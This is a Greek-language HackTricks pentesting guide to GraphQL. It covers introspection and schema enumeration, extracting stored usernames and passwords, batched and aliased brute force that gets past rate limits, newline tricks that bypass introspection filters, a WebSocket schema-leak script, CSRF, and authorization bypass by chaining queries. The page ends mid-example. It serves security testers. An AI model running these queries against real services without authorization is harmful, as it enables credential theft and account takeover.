# GraphQL

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Εισαγωγή

Το GraphQL είναι **τονισμένο** ως μια **αποτελεσματική εναλλακτική** στο REST API, προσφέροντας μια απλοποιημένη προσέγγιση για την ανάκτηση δεδομένων από το backend. Σε αντίθεση με το REST, το οποίο συχνά απαιτεί πολλές αιτήσεις σε διάφορα endpoints για τη συλλογή δεδομένων, το GraphQL επιτρέπει την ανάκτηση όλων των απαιτούμενων πληροφοριών μέσω μιας **μοναδικής αίτησης**. Αυτή η απλοποίηση **ωφελεί σημαντικά τους προγραμματιστές** μειώνοντας την πολυπλοκότητα των διαδικασιών ανάκτησης δεδομένων τους.

## GraphQL και Ασφάλεια

Με την εμφάνιση νέων τεχνολογιών, συμπεριλαμβανομένου του GraphQL, προκύπτουν επίσης νέες ευπάθειες ασφαλείας. Ένα βασικό σημείο που πρέπει να σημειωθεί είναι ότι **το GraphQL δεν περιλαμβάνει μηχανισμούς αυθεντικοποίησης από προεπιλογή**. Είναι ευθύνη των προγραμματιστών να εφαρμόσουν τέτοια μέτρα ασφαλείας. Χωρίς κατάλληλη αυθεντικοποίηση, τα endpoints του GraphQL μπορεί να εκθέσουν ευαίσθητες πληροφορίες σε μη αυθεντικοποιημένους χρήστες, θέτοντας σημαντικό κίνδυνο ασφαλείας.

### Επιθέσεις Brute Force Καταλόγου και GraphQL

Για να εντοπιστούν εκτεθειμένες περιπτώσεις GraphQL, συνιστάται η συμπερίληψη συγκεκριμένων διαδρομών σε επιθέσεις brute force καταλόγου. Αυτές οι διαδρομές είναι:

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

Ο εντοπισμός ανοιχτών περιπτώσεων GraphQL επιτρέπει την εξέταση των υποστηριζόμενων ερωτημάτων. Αυτό είναι κρίσιμο για την κατανόηση των δεδομένων που είναι προσβάσιμα μέσω του endpoint. Το σύστημα εσωτερικής αναγνώρισης του GraphQL διευκολύνει αυτό, παρέχοντας λεπτομέρειες για τα ερωτήματα που υποστηρίζει ένα σχήμα. Για περισσότερες πληροφορίες σχετικά με αυτό, ανατρέξτε στην τεκμηρίωση του GraphQL σχετικά με την εσωτερική αναγνώριση: [**GraphQL: A query language for APIs.**](https://graphql.org/learn/introspection/)

### Δακτυλοσκοπία

Το εργαλείο [**graphw00f**](https://github.com/dolevf/graphw00f) είναι ικανό να ανιχνεύσει ποια μηχανή GraphQL χρησιμοποιείται σε έναν διακομιστή και στη συνέχεια εκτυπώνει κάποιες χρήσιμες πληροφορίες για τον ελεγκτή ασφαλείας.

#### Καθολικά ερωτήματα <a href="#universal-queries" id="universal-queries"></a>

Για να ελεγχθεί αν μια διεύθυνση URL είναι υπηρεσία GraphQL, μπορεί να σταλεί ένα **καθολικό ερώτημα**, `query{__typename}`. Εάν η απάντηση περιλαμβάνει `{"data": {"__typename": "Query"}}`, επιβεβαιώνει ότι η διεύθυνση URL φιλοξενεί ένα endpoint GraphQL. Αυτή η μέθοδος βασίζεται στο πεδίο `__typename` του GraphQL, το οποίο αποκαλύπτει τον τύπο του ερωτηθέντος αντικειμένου.
```javascript
query{__typename}
```
### Βασική Αρίθμηση

Το Graphql συνήθως υποστηρίζει **GET**, **POST** (x-www-form-urlencoded) και **POST**(json). Αν και για λόγους ασφαλείας συνιστάται να επιτρέπεται μόνο το json για να αποτραπούν οι επιθέσεις CSRF.

#### Εξερεύνηση

Για να χρησιμοποιήσετε την εξερεύνηση για να ανακαλύψετε πληροφορίες σχήματος, ερωτήστε το πεδίο `__schema`. Αυτό το πεδίο είναι διαθέσιμο στον ριζικό τύπο όλων των ερωτήσεων.
```bash
query={__schema{types{name,fields{name}}}}
```
Με αυτή την ερώτηση θα βρείτε το όνομα όλων των τύπων που χρησιμοποιούνται:

![](<../../.gitbook/assets/image (1036).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

Με αυτή την ερώτηση μπορείτε να εξαγάγετε όλους τους τύπους, τα πεδία του και τα επιχειρήματα του (και τον τύπο των επιχειρημάτων). Αυτό θα είναι πολύ χρήσιμο για να γνωρίζετε πώς να κάνετε ερωτήσεις στη βάση δεδομένων.

![](<../../.gitbook/assets/image (950).png>)

**Σφάλματα**

Είναι ενδιαφέρον να γνωρίζετε αν τα **σφάλματα** θα **εμφανιστούν** καθώς θα συμβάλλουν με χρήσιμες **πληροφορίες.**
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
![](<../../.gitbook/assets/image (416).png>)

**Καταμέτρηση Σχήματος Βάσης Δεδομένων μέσω Εξερεύνησης**

{% hint style="info" %}
Εάν η εξερεύνηση είναι ενεργοποιημένη αλλά το παραπάνω ερώτημα δεν εκτελείται, δοκιμάστε να αφαιρέσετε τις οδηγίες `onOperation`, `onFragment` και `onField` από τη δομή του ερωτήματος.
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Ενσωματωμένο ερωτηματολόγιο ανασκόπησης:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
Η τελευταία γραμμή κώδικα είναι ένα graphql query που θα εξάγει όλες τις μετα-πληροφορίες από το graphql (ονόματα αντικειμένων, παραμέτρους, τύπους...)

![](<../../.gitbook/assets/image (363).png>)

Αν η introspection είναι ενεργοποιημένη, μπορείτε να χρησιμοποιήσετε [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) για να δείτε σε μια GUI όλες τις επιλογές.

### Querying

Τώρα που ξέρουμε ποιο είδος πληροφορίας αποθηκεύεται στη βάση δεδομένων, ας προσπαθήσουμε να **εξάγουμε κάποιες τιμές**.

Στην introspection μπορείτε να βρείτε **ποιο αντικείμενο μπορείτε να ρωτήσετε απευθείας** (διότι δεν μπορείτε να ρωτήσετε ένα αντικείμενο απλώς επειδή υπάρχει). Στην παρακάτω εικόνα μπορείτε να δείτε ότι ο "_queryType_" ονομάζεται "_Query_" και ότι ένα από τα πεδία του αντικειμένου "_Query_" είναι "_flags_", το οποίο είναι επίσης ένας τύπος αντικειμένου. Επομένως, μπορείτε να ρωτήσετε το αντικείμενο flag.

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-17-48.png>)

Σημειώστε ότι ο τύπος του query "_flags_" είναι "_Flags_", και αυτό το αντικείμενο ορίζεται όπως παρακάτω:

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-22-57 (1).png>)

Μπορείτε να δείτε ότι τα αντικείμενα "_Flags_" αποτελούνται από **name** και **value**. Στη συνέχεια, μπορείτε να αποκτήσετε όλα τα ονόματα και τις τιμές των σημαιών με το query:
```javascript
query={flags{name, value}}
```
Σημειώστε ότι σε περίπτωση που το **αντικείμενο προς ερώτηση** είναι ενός **πρωτογενούς** **τύπου** όπως **string** όπως στο παρακάτω παράδειγμα

![](<../../.gitbook/assets/image (958).png>)

Μπορείτε απλά να το ερωτήσετε με:
```javascript
query={hiddenFlags}
```
Σε ένα άλλο παράδειγμα όπου υπήρχαν 2 αντικείμενα μέσα στο αντικείμενο τύπου "_Query_": "_user_" και "_users_".\
Αν αυτά τα αντικείμενα δεν χρειάζονται κανένα επιχείρημα για αναζήτηση, θα μπορούσατε **να ανακτήσετε όλες τις πληροφορίες από αυτά** απλά **ζητώντας** τα δεδομένα που θέλετε. Σε αυτό το παράδειγμα από το Διαδίκτυο θα μπορούσατε να εξάγετε τα αποθηκευμένα ονόματα χρηστών και κωδικούς πρόσβασης:

![](<../../.gitbook/assets/image (880).png>)

Ωστόσο, σε αυτό το παράδειγμα αν προσπαθήσετε να το κάνετε αυτό θα λάβετε αυτό το **σφάλμα**:

![](<../../.gitbook/assets/image (1042).png>)

Φαίνεται ότι με κάποιο τρόπο θα αναζητήσει χρησιμοποιώντας το "_**uid**_" επιχείρημα τύπου _**Int**_.\
Ούτως ή άλλως, ήδη γνωρίζαμε ότι, στην ενότητα [Basic Enumeration](graphql.md#basic-enumeration) προτάθηκε ένα ερώτημα που μας έδειχνε όλες τις απαραίτητες πληροφορίες: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Αν διαβάσετε την εικόνα που παρέχεται όταν εκτελώ αυτό το ερώτημα θα δείτε ότι το "_**user**_" είχε το **arg** "_**uid**_" τύπου _Int_.

Έτσι, εκτελώντας κάποια ελαφριά _**uid**_ bruteforce ανακάλυψα ότι στο _**uid**=**1**_ ανακτήθηκε ένα όνομα χρήστη και ένας κωδικός πρόσβασης:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (90).png>)

Σημειώστε ότι **ανακάλυψα** ότι μπορούσα να ζητήσω για τις **παραμέτρους** "_**user**_" και "_**password**_" γιατί αν προσπαθήσω να αναζητήσω κάτι που δεν υπάρχει (`query={user(uid:1){noExists}}`) λαμβάνω αυτό το σφάλμα:

![](<../../.gitbook/assets/image (707).png>)

Και κατά τη διάρκεια της **φάσης αρίθμησης** ανακάλυψα ότι το αντικείμενο "_**dbuser**_" είχε ως πεδία "_**user**_" και "_**password**_.

**Query string dump trick (thanks to @BinaryShadow\_)**

Αν μπορείτε να αναζητήσετε με βάση έναν τύπο συμβολοσειράς, όπως: `query={theusers(description: ""){username,password}}` και **αναζητήσετε για μια κενή συμβολοσειρά** θα **εκφορτώσει όλα τα δεδομένα**. (_Σημειώστε ότι αυτό το παράδειγμα δεν σχετίζεται με το παράδειγμα των μαθημάτων, για αυτό το παράδειγμα υποθέστε ότι μπορείτε να αναζητήσετε χρησιμοποιώντας "**theusers**" με βάση ένα πεδίο τύπου "**description**"_).

### Αναζήτηση

Σε αυτή τη ρύθμιση, μια **βάση δεδομένων** περιέχει **άτομα** και **ταινίες**. **Άτομα** αναγνωρίζονται από το **email** και το **όνομά** τους; **ταινίες** από το **όνομά** τους και την **αξιολόγηση** τους. **Άτομα** μπορούν να είναι φίλοι μεταξύ τους και επίσης να έχουν ταινίες, υποδεικνύοντας σχέσεις μέσα στη βάση δεδομένων.

Μπορείτε να **αναζητήσετε** άτομα **με βάση** το **όνομα** και να λάβετε τα email τους:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
Μπορείτε να **αναζητήσετε** άτομα **με** το **όνομα** και να αποκτήσετε τις **συνδρομημένες** **ταινίες** τους:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Σημειώστε πώς υποδεικνύεται να ανακτηθεί το `name` των `subscribedMovies` του ατόμου.

Μπορείτε επίσης να **αναζητήσετε αρκετά αντικείμενα ταυτόχρονα**. Σε αυτή την περίπτωση, γίνεται αναζήτηση 2 ταινιών:
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
Ή ακόμη **σχέσεις διαφόρων διαφορετικών αντικειμένων χρησιμοποιώντας ψευδώνυμα**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutations

**Οι μεταλλάξεις χρησιμοποιούνται για να γίνουν αλλαγές στην πλευρά του διακομιστή.**

Στην **εξερεύνηση** μπορείτε να βρείτε τις **δηλωμένες** **μεταλλάξεις**. Στην παρακάτω εικόνα ο "_MutationType_" ονομάζεται "_Mutation_" και το αντικείμενο "_Mutation_" περιέχει τα ονόματα των μεταλλάξεων (όπως "_addPerson_" σε αυτή την περίπτωση):

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-26-27 (1).png>)

Σε αυτή τη ρύθμιση, μια **βάση δεδομένων** περιέχει **άτομα** και **ταινίες**. **Άτομα** αναγνωρίζονται από το **email** και το **όνομα** τους; **ταινίες** από το **όνομα** και την **αξιολόγηση** τους. **Άτομα** μπορούν να είναι φίλοι μεταξύ τους και επίσης να έχουν ταινίες, υποδεικνύοντας σχέσεις μέσα στη βάση δεδομένων.

Μια μετάλλαξη για **δημιουργία νέων** ταινιών μέσα στη βάση δεδομένων μπορεί να είναι όπως η παρακάτω (σε αυτό το παράδειγμα η μετάλλαξη ονομάζεται `addMovie`):
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Σημειώστε πώς και οι τιμές και ο τύπος των δεδομένων υποδεικνύονται στο ερώτημα.**

Επιπλέον, η βάση δεδομένων υποστηρίζει μια **mutation** λειτουργία, ονόματι `addPerson`, η οποία επιτρέπει τη δημιουργία **persons** μαζί με τις συσχετίσεις τους με υπάρχοντες **friends** και **movies**. Είναι κρίσιμο να σημειωθεί ότι οι φίλοι και οι ταινίες πρέπει να υπάρχουν ήδη στη βάση δεδομένων πριν τους συνδέσετε με το νεοδημιουργηθέν άτομο.
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### Directive Overloading

Όπως εξηγείται σε [**μία από τις ευπάθειες που περιγράφονται σε αυτή την αναφορά**](https://www.landh.tech/blog/20240304-google-hack-50000/), η υπερφόρτωση εντολών σημαίνει την κλήση μιας εντολής ακόμη και εκατομμύρια φορές για να αναγκάσει τον διακομιστή να σπαταλήσει λειτουργίες μέχρι να είναι δυνατόν να γίνει DoS.

### Batching brute-force σε 1 API request

Αυτή η πληροφορία προήλθε από [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/).\
Αυθεντικοποίηση μέσω GraphQL API με **ταυτόχρονη αποστολή πολλών ερωτημάτων με διαφορετικά διαπιστευτήρια** για να το ελέγξουμε. Είναι μια κλασική επίθεση brute force, αλλά τώρα είναι δυνατό να σταλούν περισσότερα από ένα ζεύγη login/password ανά HTTP request λόγω της δυνατότητας batching του GraphQL. Αυτή η προσέγγιση θα παραπλανήσει τις εξωτερικές εφαρμογές παρακολούθησης ρυθμού να πιστεύουν ότι όλα είναι καλά και δεν υπάρχει bot brute-forcing που προσπαθεί να μαντέψει κωδικούς.

Παρακάτω μπορείτε να βρείτε την απλούστερη επίδειξη ενός αιτήματος αυθεντικοποίησης εφαρμογής, με **3 διαφορετικά ζεύγη email/password ταυτόχρονα**. Προφανώς είναι δυνατό να σταλούν χιλιάδες σε ένα μόνο αίτημα με τον ίδιο τρόπο:

![](<../../.gitbook/assets/image (1081).png>)

Όπως μπορούμε να δούμε από το στιγμιότυπο της απάντησης, τα πρώτα και τρίτα αιτήματα επέστρεψαν _null_ και αντανάκλασαν τις αντίστοιχες πληροφορίες στην ενότητα _error_. Η **δεύτερη μετάλλαξη είχε τα σωστά δεδομένα αυθεντικοποίησης** και η απάντηση έχει το σωστό διακριτικό συνεδρίας αυθεντικοποίησης.

![](<../../.gitbook/assets/image (119) (1).png>)

## GraphQL Χωρίς Introspection

Όλο και περισσότερα **graphql endpoints απενεργοποιούν την introspection**. Ωστόσο, τα σφάλματα που ρίχνει το graphql όταν λαμβάνει μια απροσδόκητη αίτηση είναι αρκετά για εργαλεία όπως το [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) για να αναδημιουργήσουν το μεγαλύτερο μέρος του σχήματος.

Επιπλέον, η επέκταση Burp Suite [**GraphQuail**](https://github.com/forcesunseen/graphquail) **παρακολουθεί τα αιτήματα GraphQL API που περνούν μέσω του Burp** και **δημιουργεί** ένα εσωτερικό **σχήμα** GraphQL με κάθε νέο ερώτημα που βλέπει. Μπορεί επίσης να εκθέσει το σχήμα για GraphiQL και Voyager. Η επέκταση επιστρέφει μια ψεύτικη απάντηση όταν λαμβάνει ένα ερώτημα introspection. Ως αποτέλεσμα, το GraphQuail δείχνει όλα τα ερωτήματα, τα επιχειρήματα και τα πεδία που είναι διαθέσιμα προς χρήση εντός του API. Για περισσότερες πληροφορίες [**ελέγξτε αυτό**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

Μια ωραία **λίστα λέξεων** για να ανακαλύψετε [**οντότητες GraphQL μπορεί να βρεθεί εδώ**](https://github.com/Escape-Technologies/graphql-wordlist?).

### Παράκαμψη αμυνών introspection GraphQL <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

Για να παρακαμφθούν οι περιορισμοί στις ερωτήσεις introspection σε APIs, η εισαγωγή ενός **ειδικού χαρακτήρα μετά την λέξη-κλειδί `__schema`** αποδεικνύεται αποτελεσματική. Αυτή η μέθοδος εκμεταλλεύεται κοινές παραλείψεις προγραμματιστών σε μοτίβα regex που στοχεύουν να μπλοκάρουν την introspection εστιάζοντας στη λέξη-κλειδί `__schema`. Προσθέτοντας χαρακτήρες όπως **κενά, νέες γραμμές και κόμματα**, που το GraphQL αγνοεί αλλά μπορεί να μην έχουν ληφθεί υπόψη στο regex, οι περιορισμοί μπορούν να παρακαμφθούν. Για παράδειγμα, ένα ερώτημα introspection με μια νέα γραμμή μετά το `__schema` μπορεί να παρακάμψει τέτοιες αμυντικές γραμμές:
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
Αν δεν είναι επιτυχές, εξετάστε εναλλακτικές μεθόδους αιτήσεων, όπως **GET requests** ή **POST με `x-www-form-urlencoded`**, καθώς οι περιορισμοί μπορεί να ισχύουν μόνο για τις αιτήσεις POST.

### Δοκιμάστε WebSockets

Όπως αναφέρθηκε σε [**αυτή την ομιλία**](https://www.youtube.com/watch?v=tIo\_t5uUK50), ελέγξτε αν είναι δυνατό να συνδεθείτε στο graphQL μέσω WebSockets, καθώς αυτό μπορεί να σας επιτρέψει να παρακάμψετε μια πιθανή WAF και να κάνετε την επικοινωνία websocket να διαρρεύσει το σχήμα του graphQL:
```javascript
ws = new WebSocket('wss://target/graphql', 'graphql-ws');
ws.onopen = function start(event) {
var GQL_CALL = {
extensions: {},
query: `
{
__schema {
_types {
name
}
}
}`
}

var graphqlMsg = {
type: 'GQL.START',
id: '1',
payload: GQL_CALL,
};
ws.send(JSON.stringify(graphqlMsg));
}
```
### **Ανακάλυψη Εκτεθειμένων Δομών GraphQL**

Όταν η ανάλυση είναι απενεργοποιημένη, η εξέταση του πηγαίου κώδικα της ιστοσελίδας για προφορτωμένα ερωτήματα σε βιβλιοθήκες JavaScript είναι μια χρήσιμη στρατηγική. Αυτά τα ερωτήματα μπορούν να βρεθούν χρησιμοποιώντας την καρτέλα `Sources` στα εργαλεία προγραμματιστή, παρέχοντας πληροφορίες σχετικά με το σχήμα του API και αποκαλύπτοντας πιθανώς **εκτεθειμένα ευαίσθητα ερωτήματα**. Οι εντολές για αναζήτηση στα εργαλεία προγραμματιστή είναι:
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## CSRF στο GraphQL

Αν δεν ξέρετε τι είναι το CSRF, διαβάστε την παρακάτω σελίδα:

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

Εκεί έξω θα μπορέσετε να βρείτε αρκετά GraphQL endpoints **ρυθμισμένα χωρίς CSRF tokens.**

Σημειώστε ότι τα αιτήματα GraphQL συνήθως αποστέλλονται μέσω POST requests χρησιμοποιώντας το Content-Type **`application/json`**.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
Ωστόσο, οι περισσότερες GraphQL τελικές σημεία υποστηρίζουν επίσης **`form-urlencoded` POST αιτήματα:**
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Ως εκ τούτου, καθώς τα αιτήματα CSRF όπως τα προηγούμενα αποστέλλονται **χωρίς προετοιμασία αιτημάτων**, είναι δυνατόν να **εκτελούνται** **αλλαγές** στο GraphQL εκμεταλλευόμενοι ένα CSRF.

Ωστόσο, σημειώστε ότι η νέα προεπιλεγμένη τιμή cookie της σημαίας `samesite` του Chrome είναι `Lax`. Αυτό σημαίνει ότι το cookie θα αποστέλλεται μόνο από έναν ιστό τρίτου μέρους σε αιτήματα GET.

Σημειώστε ότι είναι συνήθως δυνατό να αποσταλεί το **αίτημα** **ερωτήματος** και ως **GET** **αίτημα και το CSRF token μπορεί να μην επικυρώνεται σε ένα GET αίτημα.**

Επίσης, εκμεταλλευόμενοι μια [**επίθεση XS-Search**](../../pentesting-web/xs-search/) μπορεί να είναι δυνατό να εξάγουμε περιεχόμενο από το GraphQL endpoint εκμεταλλευόμενοι τα διαπιστευτήρια του χρήστη.

Για περισσότερες πληροφορίες **ελέγξτε το** [**αρχικό άρθρο εδώ**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## Υπαγωγή WebSocket σε άλλες τοποθεσίες στο GraphQL

Παρόμοια με τις ευπάθειες CRSF που εκμεταλλεύονται το graphQL, είναι επίσης δυνατό να εκτελέσετε μια **υπαγωγή WebSocket σε άλλες τοποθεσίες για να εκμεταλλευτείτε μια αυθεντικοποίηση με GraphQL με μη προστατευμένα cookies** και να κάνετε έναν χρήστη να εκτελεί απροσδόκητες ενέργειες στο GraphQL.

Για περισσότερες πληροφορίες ελέγξτε:

{% content-ref url="../../pentesting-web/websocket-attacks.md" %}
[websocket-attacks.md](../../pentesting-web/websocket-attacks.md)
{% endcontent-ref %}

## Εξουσιοδότηση στο GraphQL

Πολλές λειτουργίες GraphQL που ορίζονται στο endpoint μπορεί να ελέγχουν μόνο την αυθεντικοποίηση του αιτούντος αλλά όχι την εξουσιοδότηση.

Η τροποποίηση των μεταβλητών εισόδου του ερωτήματος θα μπορούσε να οδηγήσει σε ευαίσθητες λεπτομέρειες λογαριασμού [leaked](https://hackerone.com/reports/792927).

Η μετάλλαξη θα μπορούσε ακόμη να οδηγήσει σε κατάληψη λογαριασμού προσπαθώντας να τροποποιήσει δεδομένα άλλου λογαριασμού.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### Παράκαμψη εξουσιοδότησης στο GraphQL

[Η αλυσίδωση ερωτημάτων](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) μπορεί να παρακάμψει ένα αδύναμο σύστημα αυθεντικοποίησης.

Στο παρακάτω παράδειγμα μπορείτε να δείτε ότι η λειτουργία είναι "forgotPassword" και ότι θα έπρεπε να εκτελεί μόνο το ερώτημα forgotPassword που σχετίζεται με αυτό. Αυτό μπορεί να παρακαμφθεί προσθέτοντας ένα ερώτημα στο τέλος, σε αυτή την περίπτωση προσθέτουμε "register" και μια μεταβλητή χρήστη για το σύστημα να εγγραφεί ως νέος χρήστης.

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## Παράκαμψη Περιορισμών Ρυθμού Χρησιμοποιώντας Ψευδώνυμα στο GraphQL

Στο GraphQL, τα ψευδώνυμα είναι μια ισχυρή δυνατότητα που επιτρέπει την **ρητή ονομασία ιδιοτήτων** κατά την εκτέλεση ενός αιτήματος API. Αυτή η δυνατότητα είναι ιδιαίτερα χρήσιμη για την ανάκτηση **πολλαπλών παραδειγμάτων του ίδιου τύπου** αντικειμένου μέσα σε ένα μόνο αίτημα. Τα ψευδώνυμα μπορούν να χρησιμοποιηθούν για να ξεπεράσουν τον περιορισμό που εμποδίζει τα αντικείμενα GraphQL να έχουν πολλές ιδιότητες με το ίδιο όνομα.

Για μια λεπτομερή κατανόηση των ψευδωνύμων GraphQL, προτείνεται η παρακάτω πηγή: [Ψευδώνυμα](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Ενώ ο κύριος σκοπός των ψευδωνύμων είναι να μειώσουν την ανάγκη για πολλές κλήσεις API, έχει εντοπιστεί μια ακούσια περίπτωση χρήσης όπου τα ψευδώνυμα μπορούν να αξιοποιηθούν για την εκτέλεση επιθέσεων brute force σε ένα GraphQL endpoint. Αυτό είναι δυνατό επειδή ορισμένα endpoints προστατεύονται από περιοριστές ρυθμού που έχουν σχεδιαστεί για να αποτρέπουν επιθέσεις brute force περιορίζοντας τον **αριθμό των αιτημάτων HTTP**. Ωστόσο, αυτοί οι περιοριστές ρυθμού μπορεί να μην λαμβάνουν υπόψη τον αριθμό των λειτουργιών μέσα σε κάθε αίτημα. Δεδομένου ότι τα ψευδώνυμα επιτρέπουν την προσθήκη πολλών ερωτημάτων σε ένα μόνο αίτημα HTTP, μπορούν να παρακάμψουν τέτοιες ρυθμίσεις περιορισμού.

Σκεφτείτε το παράδειγμα που παρέχεται παρακάτω, το οποίο απεικονίζει πώς μπορούν να χρησιμοποιηθούν τα ψευδώνυμα ερωτημάτων για να επαληθεύσουν την εγκυρότητα των κωδικών έκπτωσης καταστήματος. Αυτή η μέθοδος θα μπορούσε να παρακάμψει τον περιορισμό ρυθμού, καθώς συγκεντρώνει αρκετά ερωτήματα σε ένα αίτημα HTTP, επιτρέποντας ενδεχομένως την επαλήθευση πολλών κωδικών έκπτωσης ταυτόχρονα.
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
